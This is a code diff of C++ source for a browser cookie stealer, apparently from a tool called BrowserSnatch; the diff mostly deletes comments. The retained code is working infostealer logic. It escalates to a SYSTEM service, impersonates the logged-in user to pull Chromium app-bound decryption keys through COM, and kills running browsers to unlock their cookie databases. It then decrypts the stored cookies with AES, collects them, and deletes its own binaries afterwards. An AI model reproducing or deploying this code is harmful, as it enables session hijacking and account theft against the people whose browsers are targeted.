@@ -16,8 +16,7 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 	{
 		if (service_parameter.find("-exec") != std::string::npos)
 		{
-			//CALL COM OBJECTS and snatch keys
-			//CALL Functions that will be in Decryptor class
+
 
 			AppBoundDecryptor app_obj;
 			if (!app_obj.RequestCOM(service_parameter))
@@ -25,25 +24,24 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 
 			exit(0);
 		}
-		//---------------------------------------
+
 
 		char modulePath[MAX_PATH];
 		if (GetModuleFileNameA(NULL, modulePath, MAX_PATH) == 0) {
 			exit(-1);
 		}
 
-		//AppBoundKeyDecryptor key_obj;
+
 		std::string target_user_data;
 		std::string target_location_data;
 
-		// Those paths that contains \\ at the end means they have the default file 'User Data'
-		// Those paths that doesn't contain \\ at the end means they are the data directories themselves
+
 		for (const auto& dir : browsers_app_bound) {
 			if (dir.back() == '\\')
 				target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir + "User Data";
 			else
 			{
-				// in case of opera, the login data is in roaming instead of local
+
 				if (dir.find("Opera") != std::string::npos)
 					target_user_data = "C:\\users\\" + service_parameter + "\\" + "AppData\\Roaming\\" + dir;
 				else
@@ -58,7 +56,7 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 			std::string exeName = fileContent.substr(fileContent.find_last_of("\\/") + 1);
 			size_t lastSlash = fileContent.find_last_of("\\");
 			size_t secondLastSlash = fileContent.find_last_of("\\", lastSlash - 1);
-			//size_t thirdLastSlash = fileContent.find_last_of("\\", secondLastSlash - 1);
+
 			std::string grandParentFolder = fileContent.substr(0, secondLastSlash);
 			std::string destinationPath = grandParentFolder + "\\" + exeName;
 
@@ -66,89 +64,61 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 				exit(-1);
 			}
 
-			////-------------------------------------------------------------------------
+
 			std::string service_parameter_flagged = service_parameter + "-exec";
 			std::vector<std::string> parameters = { "-app-bound-decryption", "-service", service_parameter_flagged };
 
-			// Build command line string
+
 			std::string commandLine = destinationPath.c_str();
 
 			for (const auto& param : parameters) {
 				commandLine += " " + param;
 			}
 
-			////---------------------------------------------------------------------------
-			//std::wstring w_cmdline = StringToWString(commandLine);
-			//STARTUPINFO si = { sizeof(si) };
-			//PROCESS_INFORMATION pi;
 
-			//if (!CreateProcess(
-			//	NULL,                  // No module name (use command line)
-			//	const_cast<LPWSTR>(w_cmdline.c_str()), // Command line
-			//	NULL,                  // Process handle not inheritable
-			//	NULL,                  // Thread handle not inheritable
-			//	FALSE,                // Set handle inheritance to FALSE
-			//	0,                     // No creation flags
-			//	NULL,                  // Use parent's environment block
-			//	NULL,                  // Use parent's starting directory 
-			//	&si,                   // Pointer to STARTUPINFO structure
-			//	&pi)                   // Pointer to PROCESS_INFORMATION structure
-			//	) {
-			//	// Handle error
-			//}
-
-			//// Optionally, wait for the process to finish
-			//WaitForSingleObject(pi.hProcess, INFINITE);
-
-			//// Close handles
-			//CloseHandle(pi.hProcess);
-			//CloseHandle(pi.hThread);
-			////--------------------------------------------------------------------------
-
-			//Since this section of code is running as a SERVICE with SYSTEM privileges so in order to interact with the COM objects, we need user mode privileges. Need to create process as a user.
 			std::wstring w_cmdline = StringToWString(commandLine);
 
-			// Get the active user session
+
 			DWORD sessionId = WTSGetActiveConsoleSessionId();
 			HANDLE hUserToken;
 
 			if (!WTSQueryUserToken(sessionId, &hUserToken)) {
-				//std::cerr << "Failed to get user token. Error: " << GetLastError() << std::endl;
+
 				exit(-1);
 			}
 
-			// Set up process startup info
+
 			STARTUPINFO si = { sizeof(si) };
 			PROCESS_INFORMATION pi = {};
 
-			// Create the process as the user
+
 			if (!CreateProcessAsUser(
-				hUserToken,               // User token
-				NULL,                     // No module name (use command line)
-				const_cast<LPWSTR>(w_cmdline.c_str()), // Command line
-				NULL,                     // Process handle not inheritable
-				NULL,                     // Thread handle not inheritable
-				FALSE,                    // Set handle inheritance to FALSE
-				0,						  // No creation Flags
-				NULL,                     // Use parent's environment block
-				NULL,                     // Use parent's starting directory
-				&si,                      // Pointer to STARTUPINFO structure
-				&pi                       // Pointer to PROCESS_INFORMATION structure
+				hUserToken,
+				NULL,
+				const_cast<LPWSTR>(w_cmdline.c_str()),
+				NULL,
+				NULL,
+				FALSE,
+				0,
+				NULL,
+				NULL,
+				&si,
+				&pi
 			)) {
-				//std::cerr << "Failed to create process as user. Error: " << GetLastError() << std::endl;
+
 				CloseHandle(hUserToken);
 				exit(-1);
 			}
 
-			// Optionally, wait for the process to finish
+
 			WaitForSingleObject(pi.hProcess, INFINITE);
 
-			// Close handles
+
 			CloseHandle(pi.hProcess);
 			CloseHandle(pi.hThread);
 			CloseHandle(hUserToken);
 
-			//-------Delete binaries in here
+
 			DeleteFileAfterExit(destinationPath.c_str());
 		}
 		exit(0);
@@ -160,18 +130,15 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 		RestartAsAdmin("-app-bound-decryption");
 	}
 
-	//Decrypt key variables
+
 	std::string service_data_path = "c:\\users";
 	service_data_path += "\\public\\";
 	service_data_path += "NTUSER.dat";
 
-	//---------------------
-	//Avoiding key snatching through COM if file already exists
-	//Personal Note: Need a recalibrate function for BrowserSnatch
 
 	if (!file_exist(service_data_path))
 	{
-		//Initiate Key Snatching
+
 		std::wstring TaskName = StringToWString("shaddy43");
 		std::wstring Path = GetExecutablePath();
 		std::string combine_arg = "-app-bound-decryption -service " + username;
@@ -193,27 +160,25 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 	std::string target_cookie_data;
 	std::string target_cookies_location;
 
-	// Those paths that contains \\ at the end means they have the default file 'User Data'
-	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
+
 	for (const auto& dir : browsers_app_bound) {
 
 		if (dir.back() == '\\')
 			target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir + "User Data";
 		else
 		{
-			// in case of opera, the login data is in roaming instead of local
+
 			if (dir.find("Opera") != std::string::npos)
 				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
 			else
 				target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir;
 		}
 
-		//target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";
 
 		target_cookies_location = "\\Network\\Cookies";
 		target_cookie_data = target_user_data + "\\Default" + target_cookies_location;
 
-		// -------------- search profiles -----------------
+
 		std::vector<std::string> target_profiles = { target_cookie_data };
 		int browser_profile_number = 0;
 		std::string search_profile;
@@ -236,7 +201,7 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 
 				if (stmt == nullptr)
 				{
-					// cookies file is locked when chromium based browser is running
+
 					if (!kill_process(dir))
 						continue;
 
@@ -266,7 +231,7 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 						char* expiry = (char*)sqlite3_column_text(stmt, 4);
 
 						if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
-							// Assign the BLOB data to the std::vector<BYTE>
+
 							cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);
 
 							if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
@@ -274,14 +239,14 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 
 							try
 							{
-								//decrypt cookies here
+
 								std::string decrypted_cookies = obj.AESDecrypter(cookies);
 
 								if (decrypted_cookies.empty())
 									continue;
 
 								if (decrypted_cookies.size() > 32) {
-									decrypted_cookies.erase(0, 32);  // Remove the first 32 bytes
+									decrypted_cookies.erase(0, 32);
 								}
 
 								data.get_cookies_manager().setCookies(decrypted_cookies);
@@ -298,7 +263,7 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 							data_list.push_back(data);
 						}
 						else {
-							// Handle the case where the cookies_blob is null (no data)
+
 							continue;
 						}
 					}
